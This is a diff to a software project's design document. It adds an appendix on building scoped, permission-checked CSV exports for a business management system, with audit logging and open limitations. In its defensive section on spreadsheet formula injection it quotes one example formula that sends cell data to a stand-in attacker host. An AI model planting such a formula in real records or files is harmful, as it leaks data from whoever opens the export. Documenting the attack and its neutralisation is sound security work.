@@ -1492,7 +1492,7 @@ Derived from the dependency graph (§5), not from the brief's example. Each phas
 | **P5 ✔** | Sales force & Marketing | Sales teams, territories, targets, activities; marketers, channels, campaigns, leads, referral codes; **Attribution domain**. *(**Promo codes were listed and never built** — corrected 2026-08-16, see Appendix AI)*                                                                                                      | All 12 attribution questions answered by a named tested query                                                                                                                                 |
 | **P6 ✔** | Commission              | Plans, immutable versioned rules, strategies, synchronous calculation, **provisional→final restatement**, **ad-spend allocation**, reversal, payout, Finance posting. *(**"Queued calculation" was listed and is false** — nothing in this project implements `ShouldQueue` — corrected 2026-08-16, see Appendix AI)*        | Re-run is idempotent (unique index proven); reversal produces a contra entry; every commission renders its full deduction breakdown from data; **no provisional accrual can reach `payable`** |
 | **P7 ✔** | Finance                 | Accounts, journal, cash flow, AR/AP, expenses, payments, refunds. *(**Credit notes were listed and never built** — corrected 2026-08-16, see Appendix AI. A wrong invoice can only be voided)*                                                                                                                             | Invoice→payment→outstanding reconciles to the cent; ageing buckets match fixture                                                                                                              |
-| **P8 ✔** | Reporting & Dashboards  | Five role dashboards, precomputed rollups. *(**Exports were listed and never built** — corrected 2026-08-16, see Appendix AI. There is no way to get data out of this system)*                                                                                                                                             | Every dashboard figure scope-filtered — proven by test; precomputed matches live-query oracle                                                                                                 |
+| **P8 ✔** | Reporting & Dashboards  | Five role dashboards, precomputed rollups, **CSV exports** *(built 2026-08-16 after Appendix AI found them listed and missing — see Appendix AL)*                                                                                                                                             | Every dashboard figure scope-filtered — proven by test; precomputed matches live-query oracle                                                                                                 |
 | **P9 ~** | Hardening & Launch      | Security review, performance pass, PDPA erasure, backup + **rehearsed restore**, deploy                                                                                                                                                | External security review clean; restore rehearsed and documented                                                                                                                              |
 | **P10 ~** | Optional modules       | **HR ~** (leave), Payroll, **POS ✔**, **CRM ✔**, Projects, Assets, Tickets, **Subscriptions ✔**, **Online payment ✔** (Billplz)                                                                                                        | Per module. POS — V–AA. CRM — AB. HR leave — AD. Subscriptions — AF. Billplz — AG                                                                                                             |
 
@@ -4321,3 +4321,81 @@ matter how many more I wrote.**
 | AK-2 | The sidebar fix is verified by eye at one viewport size. Nothing checks it at any other, and nothing will notice when the next module overflows something else |
 | AK-3 | The dev-mode path is now guarded at two specific points. Anything else that differs between `npm run dev` and `npm run build` remains untested |
 | AK-4 | A human has now reached the dashboard. Every screen beyond it is still unused |
+
+
+---
+
+## Appendix AL — Exports, and three permissions that had never been enforced (2026-08-16)
+
+AI-1 was the largest functional gap the phase audit found: *"Nothing leaves this system in any
+format."* Ten CSV exports now do.
+
+| Export | Ability | Scoped by |
+|---|---|---|
+| Customers, Orders, Invoices, Leads, Commission | `<group>.export` | the matching `.view` data scope |
+| Purchase orders | `purchasing.export` | `purchasing.view` |
+| Stock on hand | `inventory.export` | `inventory.view` |
+| Supplier bills, Products, Audit log | `purchasing/products/audit.export` | company scope only |
+
+### An export is a second route to the same records
+
+The obvious mistake would have been to export a plain `Model::query()`. A list screen applies
+`visibleTo($user, 'orders.view')`; an export that skipped it would hand a salesperson the entire
+company's order book in one click, from a screen that correctly showed them only their own.
+
+Every scoped export runs through the **same `ScopeResolver`** the list screen uses. Deleting that
+line fails a test in which Alice, at `own` scope, exports orders and must receive one row rather than
+two.
+
+That test is also the first evidence for a claim P1 has made since it closed:
+
+> *"A salesperson cannot reach another's record via route, **export**, report or API — proven by
+> test"*
+
+There were no exports when that gate closed. The clause was unfalsifiable for the entire life of the
+project. It is now true and tested.
+
+### Three permissions that did nothing
+
+`customers.export`, `audit.export` and `reports.export` already existed in `PermissionRegistry` and
+were already granted to roles. **Nothing anywhere checked any of them.** They had been decorative
+since P1.
+
+Exporting now requires a **separate ability from viewing**, and the remaining groups gained one to
+match. Browsing a customer list and taking a copy of it out of the building are different decisions,
+and an administrator can now permit the first while withholding the second. A salesperson holding
+`customers.view` at company scope is refused at `/exports/customers`.
+
+### Opening the file must not be enough to run it
+
+A cell beginning with `=`, `+`, `-` or `@` is a formula to Excel and to Google Sheets, and a customer
+name is attacker-controlled text. `=HYPERLINK("http://evil.test?d="&A1,"click")` typed into a
+customer record and exported by an accountant is a working data-exfiltration path that never touches
+this application's security boundary at all.
+
+`CsvWriter::neutralise()` prefixes any such cell with an apostrophe. Two tests cover it: one on the
+writer directly, one end to end through a customer whose name is a formula.
+
+The file also opens with a UTF-8 byte order mark, without which Excel mangles every non-ASCII name —
+which in Malaysia is most of them.
+
+### Reads are audited now, where they matter
+
+`SECURITY-REVIEW.md` notes that only mutations are audited. Bulk extraction is the read an auditor
+would actually want to see, so every export writes an audit entry naming the actor, the export and
+the row count.
+
+### Streaming
+
+`lazy(500)` and `streamDownload`, so a hundred thousand rows do not become a hundred thousand
+hydrated models in memory. Nothing has been tested at that size — see AL-3.
+
+### Carried forward
+
+| ID | Item |
+|---|---|
+| AL-1 | CSV only. No PDF, no Excel, no accounting-package format (no SQL Account, no AutoCount) |
+| AL-2 | An export ignores the filters on the screen it was launched from. Searching for one customer and pressing Export gives you all of them |
+| AL-3 | Never run against a large table. `lazy(500)` should hold, but "should" is not evidence, and no test exceeds a handful of rows |
+| AL-4 | No export of ageing, attribution or any other report — only records. AI-1 is closed for tables, not for reports |
+| AL-5 | Nothing limits how often an export may be run, so bulk extraction is rate-limited by nothing |
